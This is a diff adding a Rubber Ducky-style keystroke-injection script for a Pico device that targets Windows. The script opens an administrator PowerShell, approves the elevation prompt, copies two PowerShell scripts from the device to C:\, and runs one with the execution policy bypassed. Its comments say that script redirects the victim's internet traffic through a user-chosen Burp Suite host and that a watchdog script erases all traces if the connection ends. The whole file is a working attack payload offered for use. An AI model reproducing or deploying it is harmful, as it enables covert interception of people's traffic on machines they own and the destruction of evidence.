@@ -1,0 +1,28 @@
+REM Ducky script to copy ps1 scripts on pico to target and run them as admin
+
+REM Target: Windows
+
+REM Purpose of ps1 scripts: Create a specialized proxy to redirect internet traffic through a user-set IP address that hosts burp suite
+REM     Along with a watchdog script to delete any traces of proxy and scripts if the proxy connection is terminated (can be disabled by removing last line in burp-enable.ps1)
+
+GUI x
+DELAY 600
+STRING a
+DELAY 1000
+ALT y
+DELAY 1500
+STRING $duck = (Get-WmiObject Win32_LogicalDisk | Where-Object {$_.VolumeName -eq "DUCKY"}).DeviceID
+DELAY 50
+ENTER
+DELAY 300
+STRING Copy-Item "$duck\burp-enable.ps1" 'C:\'
+DELAY 50
+ENTER
+DELAY 500
+STRING Copy-Item "$duck\burp-watchdog.ps1" 'C:\'
+DELAY 50
+ENTER
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -File C:\burp-enable.ps1
+DELAY 50
+ENTER
